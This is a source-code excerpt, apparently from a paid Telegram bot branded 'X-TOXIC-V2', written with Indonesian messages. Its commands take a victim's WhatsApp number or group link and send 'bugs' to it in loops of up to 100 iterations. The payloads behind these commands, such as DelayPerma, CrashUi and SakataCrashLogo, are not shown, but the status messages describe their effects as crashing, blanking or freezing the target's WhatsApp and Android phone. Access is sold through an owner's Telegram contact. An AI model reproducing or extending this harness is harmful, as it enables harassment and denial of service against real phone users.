  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Blank
◇ TARGET : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 10; i++) {
      await MarkNyawit(sock, jid);
      await sleep(1000);
      await R7XNewsletterCrash(sock, jid)

      console.log(
        chalk.red(`[XTV] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Blank
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Xone (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Blank One Msg
◇ TARGET : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await NanasOneMsg(sock, jid);
      await sleep(1000)

      console.log(
        chalk.red(`[XTV] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Blank One Msg
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Newsletter (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Newsletter Crash
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 10; i++) {
      await R7XNewsletterCrash(sock, jid);
      await sleep(1000)
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Newsletter Crash
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Extremedelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Delay Hard
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 30; i++) {
      await DelayHardV4(jid);
      await sleep(1000);
      await DelayOneMsgPermaXTV(sock, jid);
      await sleep(2000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Delay Hard
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Spamlay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Delay Bebas Spam
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 20; i++) {
      await DenglayKebeletPipis(sock, jid)
      await sleep(700);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Delay Bebas Spam
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xperma (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Delay Permanent
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 100; i++) {
      await DelayPerma(sock, jid);
      await sleep(2000);
      await DelayPerma(sock, jid);
      await sleep(2000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Delay Permanent
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xpiaa (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Delay Hard
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 100; i++) {
      await SktPerma(sock, jid);
      await sleep(2000);
      await SktPerma(sock, jid);
      await sleep(2000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Delay Hard
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xuiandro (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Blank Android UI
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 100; i++) {
      await CrashUi(sock, jid);
      await sleep(2000);
      await BlankApong(sock, jid);
      await sleep(2000);
      await SakataCrashLogo(sock, jid);
      await sleep(2000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Blank Android UI
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xandro (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Blank Android
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 100; i++) {
      await BlankMssg(sock, jid);
      await sleep(1000);
      await SakataCrashLogo(sock, jid);
      await sleep(1000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Blank Android
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xlogo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/R4f14ndr4",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Proses Send Bug
◇ EFEK BUG : Stuck Logo Android
◇ TARGET : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 50; i++) {
      await SakataCrashLogo(sock, jid);
      await sleep(1000);
      
      console.log(
        chalk.red(
          `[XTV] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ X-TOXIC-V2 ⊰―—═⬡
◇ PENGIRIM : ${username}
◇ STATUS : Succes Send Bug
◇ EFEK BUG : Stuck Logo Android
◇ TARGET : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`LU SIAPA? JOIN SALURAN DULU KALO MAU DI KASI AKSES, JANGAN LUPA CHAT APONG\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Saluran WhatsApp",
              url: "https://whatsapp.com/channel/0029VbBxK7VIt5s0qu11K41J",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: /blankgroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 100; i++) {
            await BlankApongOneMssg(groupId.id);
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/vyfn5n.jpg", {
        caption: `
<pre>
# X-TOXIC-V2
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// TOOLS MENU
bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    let code = null;

    const reply = msg.reply_to_message;

    // Ambil dari balasan teks
    if (reply?.text) {
      code = reply.text;
    }

    // Ambil dari file .js
    else if (reply?.document) {
      const doc = reply.document;

      if (
        doc.mime_type === "application/javascript" ||
        doc.file_name.endsWith(".js")
      ) {
        const file = await bot.getFile(doc.file_id);
        const fileLink = `https://api.telegram.org/file/bot${token}/${file.file_path}`;

        const res = await fetch(fileLink);
        code = await res.text();
      }
    }

    if (!code) {
      return bot.sendMessage(chatId, "❌ Balas pesan teks error atau file .js dulu bre.");
    }

    await bot.sendMessage(chatId, "🧠 Otw gua bantu benerin kodenya ya bre...");

    const prompt = ` 
Lu adalah AI expert dalam memperbaiki semua kode pemrograman (seperti JavaScript, Python, C++, dll). Tugas lu:

1. Perbaiki kode yang error atau bermasalah tanpa penjelasan tambahan.
2. Langsung tulis ulang kodenya yang sudah diperbaiki.
3. Jangan kasih penjelasan, cukup kirim kodenya aja.
